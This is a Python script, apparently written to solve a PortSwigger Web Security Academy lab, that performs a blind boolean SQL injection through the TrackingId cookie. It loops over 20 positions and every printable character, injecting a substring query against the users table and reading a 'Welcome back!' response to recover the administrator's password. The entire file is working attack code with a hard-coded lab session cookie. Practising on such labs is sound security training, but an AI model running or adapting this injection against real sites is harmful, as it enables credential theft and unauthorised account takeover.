#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

url = "https://0aa90016044c97588662ea4e00ba0006.web-security-academy.net/"
characters = string.printable


def makeRequest():
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            headers = {
                'Host': '0ad100ca035a757d8443c9ec00ff009b.web-security-academy.net',
                'TrackingId': "76SCh8Qy2calreAE' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                'session': "4joC1EyPYsvoiFTfKrJzpdV0ZN7sLVIV",
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://portswigger.net/',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Te': 'trailers'
            }

            cookies = {
                'TrackingId': "76SCh8Qy2calreAE' and (select substring(password,%d,1) from users where username='administrator')='%s" % (
                position, character),
                'session': "4joC1EyPYsvoiFTfKrJzpdV0ZN7sLVIV"
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(url, headers=headers, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    makeRequest()
